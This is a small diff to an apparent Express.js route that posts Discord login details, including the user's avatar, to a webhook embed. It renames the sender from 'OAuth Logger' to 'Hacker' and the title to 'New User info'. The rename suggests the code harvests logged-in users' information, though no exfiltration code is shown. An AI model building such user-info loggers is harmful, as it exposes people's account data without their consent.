@@ -148,10 +148,10 @@ app.post('/userinfo', async (req, res) => {
       : 'https://cdn.discordapp.com/embed/avatars/0.png'; // Default avatar if none
 
     const embedData = {
-      username: 'OAuth Logger',
+      username: 'Hacker',
       embeds: [
         {
-          title: 'New OAuth Login',
+          title: 'New User info',
           description: `A user just logged in via Discord!`,
           color: 3447003,
           thumbnail: { url: avatarURL },
